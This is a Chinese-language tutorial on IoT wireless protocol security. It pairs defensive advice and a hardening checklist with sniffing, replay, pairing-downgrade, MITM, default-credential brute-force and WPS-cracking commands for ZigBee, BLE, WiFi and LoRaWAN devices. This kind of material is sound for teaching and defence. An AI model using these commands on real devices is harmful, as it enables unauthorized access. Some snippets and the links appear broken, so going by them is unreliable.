# IoT 无线协议安全

## IoT 无线协议概述

IoT 设备使用多种无线通信协议，每种协议都有独特的安全挑战。

### 主要协议类型

1. **ZigBee** - 低功耗 mesh 网络
2. **Bluetooth Low Energy (BLE)** - 短距离低功耗
3. **WiFi** - 高速数据传输
4. **LoRaWAN** - 远距离低功耗
5. **NB-IoT** - 蜂窝物联网

---

## ZigBee 安全深度分析

### 协议基础

- **频率：** 2.4 GHz
- **拓扑：** Mesh 网络
- **加密：** AES-128 (AES-CCM)

### 安全机制

#### 1. 网络层安全
- **Network Key** - 加密网络层通信
- **Link Key** - 设备间点对点加密
- **Trust Center** - 集中管理密钥

#### 2. 安全模式
- **Standard Security** - 使用默认 TC Link Key
- **High Security** - 使用预配置 Link Key

### 攻击向量

#### 攻击1：密钥提取

**工具：** KillerBee, ZigDiggity

```bash
# 扫描 ZigBee 网络
zbstumbler -c 11

# 监听并抓取数据包
zbdump -c 11 -w capture.pcap

# 分析密钥交换
zbassocfmt capture.pcap
```

**防御：**
- 使用 High Security 模式
- 定期更换 Network Key
- 启用设备白名单

#### 攻击2：重放攻击

**原理：** 捕获合法数据包并重新发送

```python
# 使用 Scapy 重放 ZigBee 数据包
from scapy.all import *

packets = rdpcap('zigbee_capture.pcap')
for pkt in packets:
    if pkt.haslayer(ZigBeeNWK):
        sendp(pkt, iface='wlan0mon')
```

**防御：**
- 使用帧计数器 (Frame Counter)
- 启用 APS 层确认
- 实施时间窗口检查

---

## Bluetooth Low Energy (BLE) 安全

### 协议架构

- **物理层：** 2.4 GHz ISM 频段
- **链路层：** 广播/连接状态机
- **L2CAP：** 协议复用
- **ATT/GATT：** 属性协议/通用属性规范
- **SMP：** 安全管理协议

### BLE 安全模式

#### Mode 1: No Security (Level 1)
- 无加密，无认证
- 用于非敏感数据

#### Mode 1: Unauthenticated Pairing (Level 2)
- 加密但不认证
- 易受中间人攻击

#### Mode 1: Authenticated Pairing (Level 3)
- 加密 + 认证 (Passkey)
- 防止 MITM

#### Mode 1: LE Secure Connections (Level 4)
- 使用 ECDH + Numeric Comparison
- 最强安全级别

### 攻击技术

#### 攻击1：BLE 嗅探

**工具：** Ubertooth One, nRF52840

```bash
# 使用 Ubertooth 嗅探 BLE
ubertooth-btle -f -c capture.pcap

# 使用 Wireshark 分析
wireshark capture.pcap
```

#### 攻击2：Pairing 绕过

**原理：** 强制降级到 Level 2 (Unauthenticated)

```python
# 使用 BluePy 强制重新配对
from bluepy.btle import Peripheral

dev = Peripheral('AA:BB:CC:DD:EE:FF')
dev.setSecurityLevel(2)  # 降级安全级别
```

#### 攻击3：MITM 攻击

**工具：** GATTacker, BtleJuice

```bash
# 使用 BtleJuice 进行 MITM
btlejuice -i hci0 -t AA:BB:CC:DD:EE:FF -s
```

### 防御措施

1. **使用 Level 3/4 安全模式**
2. **启用 LE Secure Connections**
3. **实施绑定 (Bonding)**
4. **定期更换 LTK (Long Term Key)**

---

## WiFi 协议安全 (IoT 设备)

### IoT 设备的 WiFi 安全问题

1. **默认凭据** - 出厂默认用户名/密码
2. **弱加密** - WEP/WPA TKIP
3. **开放网络** - 无加密通信
4. **WPS 漏洞** - PIN 暴力破解

### 攻击案例

#### 攻击1：默认凭据利用

**目标：** 智能摄像头、智能插座

```bash
# 扫描 IoT 设备
nmap -p 80,443,8080 --open 192.168.1.0/24

# 尝试默认凭据
hydra -l admin -P default_passwords.txt 192.168.1.100 http-get /login
```

#### 攻击2：WPS PIN 暴力破解

```bash
# 使用 Reaver 攻击 WPS
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# 使用 Pixie Dust 攻击 (更快)
pixiewps -e <ESSID> -s <PIN> -z
```

### 防御建议

1. **更改默认凭据**
2. **使用 WPA2-AES 或 WPA3**
3. **禁用 WPS**
4. **启用 802.1X 认证 (企业环境)**

---

## LoRaWAN 安全

### 协议特点

- **远距离：** 城市 2-5km，乡村 15km
- **低功耗：** 电池续航数年
- **加密：** AES-128

### 安全架构

1. **Network Session Key (NwkSKey)** - 网络层完整性
2. **Application Session Key (AppSKey)** - 应用层加密

### 攻击向量

#### 攻击1：端到端加密缺失

**问题：** 某些实现中，网络运营商可以看到明文数据

**防御：**
- 实施应用层端到端加密
- 使用 AES-128 加密 payload

#### 攻击2：重放攻击

```python
# 捕获并重放 LoRa 数据包
from lora import LoRa

lora = LoRa()
captured_packet = lora.receive()

# 重放
lora.send(captured_packet)
```

**防御：**
- 使用帧计数器
- 实施时间窗口验证

---

## 协议安全对比

| 协议 | 加密 | 认证 | 主要风险 | 防护难度 |
|------|------|--------|----------|----------|
| ZigBee | AES-128 | TC Link Key | 密钥提取、重放 | 中 |
| BLE | AES-128 | Pairing | MITM、嗅探 | 低 (使用 Level 4) |
| WiFi | WPA2/3 | PSK/802.1X | 弱密码、WPS | 低 |
| LoRaWAN | AES-128 | NwkSKey/AppSKey | 重放、端到端缺失 | 高 |

---

## 安全加固清单

### ZigBee
- [ ] 使用 High Security 模式
- [ ] 定期更换 Network Key
- [ ] 启用设备白名单
- [ ] 禁用未使用的端点

### BLE
- [ ] 使用 LE Secure Connections (Level 4)
- [ ] 实施绑定 (Bonding)
- [ ] 定期更换 LTK
- [ ] 禁用调试模式

### WiFi (IoT)
- [ ] 更改默认凭据
- [ ] 使用 WPA3-SAE
- [ ] 禁用 WPS
- [ ] 启用客户端隔离

### LoRaWAN
- [ ] 实施应用层端到端加密
- [ ] 使用帧计数器
- [ ] 定期更换 Session Keys
- [ ] 实施设备认证

---

## 延伸阅读

- [ZigBee Security Basics](https://zigbee地方)
- [BLE Security Study](https://github.com/...)
- [LoRaWAN Security Framework](https://lora地方)

---

**下一步：** 学习 实战)，掌握 WiFi/Bluetooth 渗透技术。
